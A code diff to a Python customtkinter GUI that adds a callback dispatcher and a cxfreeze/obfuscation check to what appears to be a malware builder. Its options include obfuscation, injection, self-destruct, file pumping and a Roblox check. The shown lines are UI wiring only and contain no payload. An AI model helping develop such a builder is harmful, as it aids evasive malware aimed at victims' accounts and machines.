@@ -168,7 +168,7 @@ class App(customtkinter.CTk):
 
         self.obfuscation = customtkinter.CTkCheckBox(
             self.builder_frame, text="Obfuscation", font=customtkinter.CTkFont(size=17, family=self.font),
-            fg_color="#5d11c3", hover_color="#5057eb")
+            fg_color="#5d11c3", hover_color="#5057eb", command=self.check_cxfreeze)
         self.obfuscation.grid(row=1, column=0, sticky="nw", padx=286, pady=250)
 
         self.injection = customtkinter.CTkCheckBox(
@@ -177,7 +177,7 @@ class App(customtkinter.CTk):
         self.injection.grid(row=1, column=0, sticky="ne", padx=130, pady=250)
 
         self.antispam = customtkinter.CTkCheckBox(self.builder_frame, text="Anti Spam", font=customtkinter.CTkFont(size=17, family=self.font),
-                                                  fg_color="#5d11c3", hover_color="#5057eb", command=self.check_roblox)
+                                                  fg_color="#5d11c3", hover_color="#5057eb")
         self.antispam.grid(row=1, column=0, sticky="nw", padx=85, pady=295)
 
         self.self_destruct = customtkinter.CTkCheckBox(self.builder_frame, text="Self Destruct", font=customtkinter.CTkFont(size=17, family=self.font),
@@ -196,7 +196,7 @@ class App(customtkinter.CTk):
 
         self.fileopts = customtkinter.CTkOptionMenu(self.builder_frame, values=["pyinstaller", "cxfreeze", ".py"],
                                                     font=customtkinter.CTkFont(size=32, family=self.font), width=250, height=45,
-                                                    fg_color="#5d11c3", button_hover_color="#5057eb", button_color="#480c96", command=lambda x: self.check_icon())
+                                                    fg_color="#5d11c3", button_hover_color="#5057eb", button_color="#480c96", command=self.multi_commands)
         self.fileopts.grid(row=1, column=0, sticky="nw", padx=85, pady=340)
         self.fileopts.set("File Options")
 
@@ -291,6 +291,15 @@ class App(customtkinter.CTk):
         else:
             self.pump_size.configure(state="disabled")
 
+    def multi_commands(self, value):
+        if value == "pyinstaller":
+            self.check_icon()
+        elif value == "cxfreeze":
+            self.check_cxfreeze()
+            self.check_icon()
+        elif value == ".py":
+            self.check_icon()
+
     def get_mb(self):
         self.mb = self.pump_size.get()
         byte_size = int(self.mb.replace("mb", ""))
@@ -307,6 +316,11 @@ class App(customtkinter.CTk):
             self.icon.configure(state="normal")
         elif self.fileopts.get() == ".py":
             self.icon.configure(state="disabled")
+
+    def check_cxfreeze(self):
+        if self.fileopts.get() == "cxfreeze":
+            if self.obfuscation.get() == 1:
+                self.obfuscation.deselect()
 
     def get_icon(self):
         self.iconpath = filedialog.askopenfilename(initialdir="/", title="Select Icon", filetypes=(("ico files", "*.ico"), ("all files", "*.*")))
